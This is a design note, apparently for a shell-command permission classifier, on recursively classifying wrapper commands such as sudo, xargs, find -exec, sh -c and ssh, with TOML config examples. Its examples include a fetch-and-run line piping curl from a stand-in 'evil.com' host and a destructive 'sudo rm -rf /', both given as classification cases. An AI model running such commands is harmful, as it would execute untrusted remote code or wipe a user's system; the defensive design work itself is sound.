# Recursive Evaluation: Commands That Execute Commands

## The Problem

Some commands take other commands as arguments. The outer command's classification depends on what it's running:

```bash
xargs grep "TODO"              # read — xargs runs grep, which is read
xargs rm                       # write — xargs runs rm
find . -exec cat {} \;         # read — exec runs cat
find . -exec rm {} \;          # write — exec runs rm
kubectl exec pod -- ls /app    # read — runs ls inside pod
watch cat /var/log/syslog      # read — runs cat repeatedly
nice grep -r "TODO" .          # read — nice just adjusts priority
env FOO=bar grep "TODO" .      # read — env sets vars then runs grep
sudo rm -rf /                  # write — sudo elevates then runs rm
time ls -la                    # read — time measures then runs ls
```

The outer command is a "wrapper" — its classification is the classification of the inner command.

## Categories

### 1. Transparent Wrappers

Commands that don't change what happens, just how/where/when it runs. Classification = classification of the inner command.

```
sudo <cmd>          — runs cmd as root
env [VAR=val] <cmd> — runs cmd with env vars
nice <cmd>          — runs cmd with adjusted priority
nohup <cmd>         — runs cmd ignoring hangups
time <cmd>          — measures cmd execution time
timeout <cmd>       — runs cmd with a time limit
watch <cmd>         — runs cmd repeatedly
strace <cmd>        — traces cmd syscalls (read, but may generate output files with -o)
```

These are the easy case. Strip the wrapper, classify the inner command.

### 2. Commands With an Exec Flag

The command itself does something, but a specific flag causes it to execute an arbitrary subcommand.

```
find . -exec <cmd> {} \;       — find is read, but -exec runs cmd
find . -execdir <cmd> {} \;    — same
kubectl exec <pod> -- <cmd>    — kubectl is read, but exec runs cmd
docker exec <container> <cmd>  — same pattern
docker run <image> <cmd>       — runs cmd in new container
ssh <host> <cmd>               — runs cmd on remote host
```

These are already partially handled by the flag system (`-exec` → unknown). But we can do better: instead of `unknown`, parse the subcommand and classify it recursively.

### 3. Piping Commands (xargs, parallel)

Commands that take a command template and apply it to stdin input.

```
xargs <cmd>                    — runs cmd with stdin as args
xargs -I{} <cmd> {}           — runs cmd with placeholder
parallel <cmd>                 — GNU parallel, same idea
```

Same approach: extract the subcommand, classify it.

## How to Handle in the Database

### Mark Commands as "Recursive"

Add a field that tells the classifier: "this command's classification depends on its arguments — find the inner command and classify that."

```toml
# db/xargs.toml
command = "xargs"
default = "unknown"          # fallback if we can't parse the inner command
recursive = true             # tells classifier to look at arguments
inner_command_position = 1   # first non-flag argument is the command

# db/sudo.toml
command = "sudo"
default = "unknown"
recursive = true
inner_command_position = 1   # first non-flag argument after sudo's own flags

# db/env.toml
command = "env"
default = "read"             # env with no command just prints env vars
recursive = true
inner_command_position = "after_vars"  # skip VAR=val pairs, then classify
```

For exec-style flags, mark the flag as triggering recursion:

```toml
# db/find.toml
command = "find"
default = "read"

[[flags]]
flag = ["-exec"]
effect = "recursive"
inner_command_terminators = [";", "+"]

[[flags]]
flag = ["-execdir"]
effect = "recursive"
inner_command_terminators = [";", "+"]

[[flags]]
flag = ["-ok"]
effect = "recursive"
inner_command_terminators = [";"]

[[flags]]
flag = ["-okdir"]
effect = "recursive"
inner_command_terminators = [";"]

[[flags]]
flag = ["-delete"]
effect = "write"
```

```toml
# db/kubectl.toml
command = "kubectl"

[subcommands.get]
default = "read"

[subcommands.apply]
default = "write"

[subcommands.exec]
default = "unknown"
recursive = true
separator = "--"             # inner command starts after --
```

## Classifier Behavior

When the classifier hits a recursive command:

1. **Extract the inner command** from the arguments (using `inner_command_position`, `separator`, or `inner_command_terminators`)
2. **Classify the inner command** against the database (same logic, same DB)
3. **Return the inner classification** as the outer classification
4. **If extraction fails** (can't parse the inner command, or it's constructed dynamically): return the `default` from the DB entry (usually `unknown`)

This naturally chains: `sudo env FOO=bar xargs grep "TODO"` → strip sudo → strip env → strip xargs → classify grep → `read`.

### Depth Limit

Set a max recursion depth (e.g., 10). If exceeded, return `unknown`. Prevents infinite loops on pathological input. In practice, real commands rarely nest more than 2-3 deep.

## What This Covers

| Command | Without recursion | With recursion |
|---------|------------------|----------------|
| `xargs grep "TODO"` | unknown | read |
| `xargs rm` | unknown | write |
| `find . -exec cat {} \;` | unknown | read |
| `find . -exec rm {} \;` | unknown | write |
| `sudo ls -la` | unknown | read |
| `sudo rm -rf /` | unknown | write |
| `kubectl exec pod -- ls` | unknown | read |
| `watch cat /var/log/app.log` | unknown | read |
| `time git log` | unknown | read |
| `nice -n 10 grep -r "TODO" .` | unknown | read |

That's a lot of unnecessary prompts eliminated.

## String Arguments Are Just Recursion Too

At first glance, `ssh host "grep foo | sort"` and `sh -c "cd /app && rm -rf logs"` feel harder — the inner command is a string, not bare arguments. But it's the same operation: extract the string, feed it back into the parser, classify the result.

```bash
sudo grep foo bar              # inner command = rest of args → parse as tokens
ssh host "grep foo | sort"     # inner command = string arg → parse as shell
sh -c "cd /app && cat log"     # inner command = string arg → parse as shell
bash -c "ls -la"               # inner command = string arg → parse as shell
```

The parser already handles pipes, redirects, compound commands. We just call it again on the string contents. The recursion depth limit handles any nesting.

### String-Argument Recursive Commands

```toml
# db/sh.toml
command = "sh"
default = "unknown"
recursive = true

[[flags]]
flag = ["-c"]
effect = "recursive"
inner_command_source = "next_arg_as_shell"  # parse the next argument as a shell expression

# db/bash.toml
command = "bash"
default = "unknown"
recursive = true

[[flags]]
flag = ["-c"]
effect = "recursive"
inner_command_source = "next_arg_as_shell"

# db/ssh.toml
command = "ssh"
default = "unknown"
recursive = true
network = true
inner_command_source = "trailing_args_as_shell"  # everything after host is a command
```

Examples:

| Command | Extraction | Inner parse | Result |
|---------|-----------|-------------|--------|
| `sh -c "grep foo bar"` | string after `-c` | `grep foo bar` → read | read |
| `sh -c "grep foo \| sort"` | string after `-c` | `grep foo \| sort` → read | read |
| `sh -c "rm -rf /tmp"` | string after `-c` | `rm -rf /tmp` → write | write |
| `ssh host "ls -la"` | trailing args | `ls -la` → read | read |
| `ssh host "cd /app && cat log"` | trailing args | `cd /app && cat log` → read | read |
| `ssh host "cd /app && rm -rf logs"` | trailing args | compound, rm → write | write |

## What Genuinely Can't Be Classified

The only true limit is **dynamic command construction** — where the inner command isn't known statically:

```bash
sh -c "$USER_COMMAND"          # variable expansion — could be anything
xargs sh -c "some_$THING"     # partial variable in command
eval "$INPUT"                  # entirely dynamic
bash <(curl http://evil.com)   # process substitution with network fetch
```

These are `unknown` because there's no string to parse — the actual command is only known at runtime. This is a hard line that applies equally to all approaches (static analysis, sandboxing, AI classifiers). The database marks these patterns:

```toml
# db/eval.toml
command = "eval"
default = "unknown"
reason = "Executes dynamically constructed command — cannot classify statically"
```

## Implementation Summary

All recursion follows the same classifier loop:

1. Parse the outer command
2. Look it up in the DB
3. If `recursive = true` or a flag has `effect = "recursive"`: extract the inner command
4. **If inner command is bare args**: already parsed, classify the tokens
5. **If inner command is a string arg**: parse the string as a new shell expression, classify it
6. Apply depth limit (e.g., 10)
7. If extraction fails or depth exceeded: return `default` (usually `unknown`)

Steps 4 and 5 are the same operation (parse + classify), just with different input sources. There's no fundamental distinction between "transparent wrapper" and "string argument" recursion — it's all just "find the inner command, classify it."

### Extraction Strategies (Encoded Per-Command in DB)

| Strategy | Field | Example |
|----------|-------|---------|
| Rest of args | `inner_command_position = 1` | `sudo rm -rf /` → `rm -rf /` |
| After separator | `separator = "--"` | `kubectl exec pod -- ls` → `ls` |
| Between terminators | `inner_command_terminators = [";", "+"]` | `find -exec cat {} \;` → `cat {}` |
| After VAR=val pairs | `inner_command_position = "after_vars"` | `env FOO=bar ls` → `ls` |
| Next arg as shell string | `inner_command_source = "next_arg_as_shell"` | `sh -c "grep foo"` → parse `"grep foo"` |
| Trailing args as shell | `inner_command_source = "trailing_args_as_shell"` | `ssh host "ls -la"` → parse `"ls -la"` |

Six strategies cover essentially all real-world recursive commands.
